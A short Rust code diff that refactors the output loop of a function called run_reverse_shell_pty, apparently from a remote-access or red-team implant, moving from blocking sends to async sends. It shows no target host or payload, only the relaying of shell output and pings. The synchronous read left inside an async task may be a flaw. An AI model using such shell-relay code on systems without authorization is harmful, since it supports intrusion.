@@ -99,7 +99,7 @@ pub async fn run_reverse_shell_pty(
     const CHUNK_SIZE: usize = 1024;
     let output_tx_clone = output_tx.clone();
     let context_val_clone = context_val.clone();
-    tokio::task::spawn_blocking(move || {
+    tokio::spawn(async move {
         loop {
             let mut buffer = [0; CHUNK_SIZE];
             let n = match reader.read(&mut buffer[..]) {
@@ -124,26 +124,31 @@ pub async fn run_reverse_shell_pty(
                         log::info!("closing output stream, exit channel closed");
                     }
                 }
-                std::thread::sleep(std::time::Duration::from_millis(50));
                 continue;
             }
 
-            if let Err(_err) = output_tx_clone.blocking_send(ReverseShellRequest {
-                context: context_val_clone.clone(),
-                kind: ReverseShellMessageKind::Data.into(),
-                data: buffer[..n].to_vec(),
-            }) {
+            if let Err(_err) = output_tx_clone
+                .send(ReverseShellRequest {
+                    context: context_val_clone.clone(),
+                    kind: ReverseShellMessageKind::Data.into(),
+                    data: buffer[..n].to_vec(),
+                })
+                .await
+            {
                 #[cfg(debug_assertions)]
                 log::error!("reverse_shell_pty output failed to queue: {_err}");
                 break;
             }
 
             // Ping to flush
-            if let Err(_err) = output_tx_clone.blocking_send(ReverseShellRequest {
-                context: context_val_clone.clone(),
-                kind: ReverseShellMessageKind::Ping.into(),
-                data: Vec::new(),
-            }) {
+            if let Err(_err) = output_tx_clone
+                .send(ReverseShellRequest {
+                    context: context_val_clone.clone(),
+                    kind: ReverseShellMessageKind::Ping.into(),
+                    data: Vec::new(),
+                })
+                .await
+            {
                 #[cfg(debug_assertions)]
                 log::error!("reverse_shell_pty ping failed: {_err}");
                 break;
